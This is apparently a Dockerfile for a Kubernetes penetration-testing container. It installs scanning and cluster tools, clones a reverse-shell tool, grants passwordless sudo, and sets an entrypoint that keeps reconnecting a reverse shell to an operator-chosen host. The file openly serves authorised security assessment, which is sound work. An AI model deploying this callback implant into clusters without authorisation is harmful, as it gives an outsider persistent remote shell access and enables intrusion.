# SPDX-FileCopyrightText: 2025 Joel Rangsmo <joel@rangsmo.se>
# SPDX-License-Identifier: CC0-1.0
# X-Context: (Docker|Container)file designed for Kubernetes security assessments 

FROM docker.io/library/ubuntu:24.04

# Set to "amd64" or "arm64" to download/build appropriate artifacts
ARG ARCH="amd64"

# Installation of "base packages"
RUN \
	apt-get update \
	&& apt-get install -y \
		sudo \
		iproute2 \
		man \
		vim \
		git \
		tmux \
		gnupg2 \
		tar \
		curl \
		netcat-openbsd \
		socat \
		dnsutils \
		nmap \
		masscan \
		build-essential \
		python3-dev \
		python3-pip \
		python3-requests \
		golang \
		golang-cfssl \
		ca-certificates \
		jq \
		moreutils \
		openssl \
	&& rm -rf /var/lib/apt-get/lists/* \
	&& apt-get autoremove -y

WORKDIR /tmp

# Setup of kubectl
ARG V_KUBECTL="1.32.1"
ARG H_AMD64_KUBECTL="e16c80f1a9f94db31063477eb9e61a2e24c1a4eee09ba776b029048f5369db0c"
ARG H_ARM64_KUBECTL="98206fd83a4fd17f013f8c61c33d0ae8ec3a7c53ec59ef3d6a0a9400862dc5b2"
RUN \
	if [ "${ARCH}" = "amd64" ]; then HASH="${H_AMD64_KUBECTL}"; else HASH="${H_ARM64_KUBECTL}"; fi \
	&& curl -L -o kubectl "https://dl.k8s.io/release/v${V_KUBECTL}/bin/linux/${ARCH}/kubectl" \
	&& echo "${HASH} kubectl" | sha256sum --check \
	&& install kubectl /usr/local/bin/ \
	&& rm kubectl

# Setup of etcd
ARG V_ETCD="3.5.17"
ARG H_AMD64_ETCD="eff6ac621d41711085d0f38fab17d8fa3705f6326c3ff11301a1f5a71fc94edd"
ARG H_ARM64_ETCD="7d717a62520bf39fa1115dfbb1df79479ff74b5eda0914f4132bfa60a48b9549"
RUN \
	if [ "${ARCH}" = "amd64" ]; then HASH="${H_AMD64_ETCD}"; else HASH="${H_ARM64_ETCD}"; fi \
	&& curl -L -o etcd.tar.gz "https://github.com/etcd-io/etcd/releases/download/v${V_ETCD}/etcd-v${V_ETCD}-linux-${ARCH}.tar.gz" \
	&& echo "${HASH} etcd.tar.gz" | sha256sum --check \
	&& tar vxf etcd.tar.gz && install etcd-*/etcdctl etcd-*/etcdutl /usr/local/bin/ \
	&& rm -rf etcd.tar.gz etcd-*
	
# Setup of auger
ARG V_AUGER="1.0.2"
ARG H_AMD64_AUGER="b78e688d2dbb42825d56793b9d6fca3b4e1f0eeed47bc733d4f3fc1e47f31de0"
ARG H_ARM64_AUGER="e1c4093b3cd3257e08674c213dda7fb8c5419153ad70af72fadcb34c1f9cd87e"
RUN \
	if [ "${ARCH}" = "amd64" ]; then HASH="${H_AMD64_AUGER}"; else HASH="${H_ARM64_AUGER}"; fi \
	&& curl -L -o auger.tar.gz "https://github.com/etcd-io/auger/releases/download/v${V_AUGER}/auger_${V_AUGER}_linux_${ARCH}.tar.gz" \
	&& echo "${HASH} auger.tar.gz" | sha256sum --check \
	&& tar vxf auger.tar.gz && install auger augerctl /usr/local/bin/ \
	&& rm auger* LICENSE README.md
	
# Setup of trivy
ARG V_TRIVY="0.58.2"
ARG H_AMD64_TRIVY="2ace3adb5076b24904b733885d4b515354217871f0a4cb93d5bbedbc983b8ff2"
ARG H_ARM64_TRIVY="61255cbdf52d324de78053b3b3800f20e1d53a570341c1ede3bd4983af166687"
RUN \
	if [ "${ARCH}" = "amd64" ]; then HASH="${H_AMD64_TRIVY}"; else HASH="${H_ARM64_TRIVY}"; fi \
	&& if [ "${ARCH}" = "amd64" ]; then LOCAL_ARCH=64bit; else LOCAL_ARCH=ARM64; fi \
	&& curl -L -o trivy.deb "https://github.com/aquasecurity/trivy/releases/download/v${V_TRIVY}/trivy_${V_TRIVY}_Linux-${LOCAL_ARCH}.deb" \
	&& echo "${HASH} trivy.deb" | sha256sum --check \
	&& apt-get install -y -f ./trivy.deb

# Setup of rbac-lookup
ARG V_RBACLOOKUP="0.10.2"
ARG H_AMD64_RBACLOOKUP="38a888fd822d13a6d8b510b81516a2d7522d1406721baaace5afc0becd5d34f0"
ARG H_ARM64_RBACLOOKUP="723bf0f58644f10ae056eae98e0910def28f2e2afa42c7f14cdfd31fdc0394e3"
RUN \
	if [ "${ARCH}" = "amd64" ]; then HASH="${H_AMD64_RBACLOOKUP}"; else HASH="${H_ARM64_RBACLOOKUP}"; fi \
	&& if [ ${ARCH} = amd64 ]; then LOCAL_ARCH=x86_64; else LOCAL_ARCH=arm64; fi \
	&& curl -L -o rbac-lookup.tar.gz "https://github.com/FairwindsOps/rbac-lookup/releases/download/v${V_RBACLOOKUP}/rbac-lookup_${V_RBACLOOKUP}_Linux_${LOCAL_ARCH}.tar.gz" \
	&& echo "${HASH} rbac-lookup.tar.gz" | sha256sum --check \
	&& tar vxf rbac-lookup.tar.gz && install rbac-lookup /usr/local/bin/ \
	&& rm rbac-lookup.tar.gz rbac-lookup LICENSE README.md

# Setup of revshell
ARG C_REVSHELL="1668b040d68b4f7a66f8d10f64fb171fbbee950f"
RUN \
	git clone https://github.com/Doctor-love/revshell.git && cd revshell \
	&& git reset --hard "${C_REVSHELL}" \
	&& install revshell /usr/local/bin/ \
	&& cd .. && rm -rf revshell

# Create unprivileged user and passwordless sudo access
RUN \
	useradd -m -s /bin/bash userx \
	&& echo "userx ALL=(ALL:ALL) NOPASSWD: ALL" \
	> /etc/sudoers.d/userx && chmod 400 /etc/sudoers.d/userx

WORKDIR /home/userx
USER userx

# Establish reverse shell or sleep for infinity if CLI argument/environment variables aren't set
ENTRYPOINT ["/bin/bash", "-c", "while true; do /usr/local/bin/revshell; sleep 3s; done"]
